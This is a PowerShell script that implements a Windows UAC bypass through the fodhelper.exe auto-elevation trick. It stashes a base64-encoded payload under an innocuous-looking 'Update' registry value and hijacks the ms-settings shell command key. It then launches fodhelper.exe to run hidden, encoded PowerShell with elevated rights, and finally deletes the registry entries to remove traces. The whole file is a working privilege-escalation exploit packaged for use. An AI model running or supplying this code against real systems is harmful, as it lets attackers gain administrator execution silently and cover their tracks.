function Invoke-FodHelperBypass {
<#
.SYNOPSIS

Bypasses UAC by performing an registry modification for FodHelper (based on https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/) 

Only tested on Windows 10

Author: Petr Medonos (@PetrMedonos)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.PARAMETER Command

 Specifies the base64 encoded command you want to run in a high-integrity context.

.EXAMPLE

Invoke-FodHelperBypass -Command "IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="

This will write out "Is Elevated: True" to C:\UACBypassTest.

#>

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if(($(whoami /groups) -like "*S-1-5-32-544*").length -eq 0) {
        "[!] Current user not a local administrator!"
        Throw ("Current user not a local administrator!")
    }
    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
        "[!] Not in a medium integrity process!"
        Throw ("Not in a medium integrity process!")
    }

    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
        "UAC is set to 'Always Notify'. This module does not bypass this setting."
        exit
    }
    else{
        #Begin Execution

        #Store the payload
        $RegPath = 'HKCU:Software\Microsoft\Windows\Update'
        $parts = $RegPath.split('\');
        $path = $RegPath.split("\")[0..($parts.count -2)] -join '\';
        $name = $parts[-1];
        $null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;

        $mssCommandPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

        $launcherCommand = $pshome + '\' + 'powershell.exe -NoP -NonI -W Hidden -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x'
        #Add in the new registry entries to execute launcher
        if ($Force -or ((Get-ItemProperty -Path $mssCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $mssCommandPath -Force | Out-Null
            New-ItemProperty -Path $mssCommandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
            Set-ItemProperty -Path $mssCommandPath -Name "(default)" -Value $launcherCommand -Force | Out-Null
        }else{
            Write-Warning "Key already exists, consider using -Force"
            exit
        }


        $FodHelperPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'fodhelper.exe'
        #Start Event Viewer
        if ($PSCmdlet.ShouldProcess($FodHelperPath, 'Start process')) {
            $Process = Start-Process -FilePath $FodHelperPath -PassThru -WindowStyle Hidden
            Write-Verbose "Started fodhelper.exe"
        }

        #Sleep 5 seconds 
        Write-Verbose "Sleeping 5 seconds to trigger payload"
        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        $mssfilePath = 'HKCU:\Software\Classes\ms-settings\'
        $PayloadPath = 'HKCU:Software\Microsoft\Windows'
        $PayloadKey = "Update"

        if (Test-Path $mssfilePath) {
            #Remove the registry entry
            Remove-Item $mssfilePath -Recurse -Force
            Remove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKey
            Write-Verbose "Removed registry entries"
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
            Write-Verbose "Killed running fodhelper process"
        }
    }
}
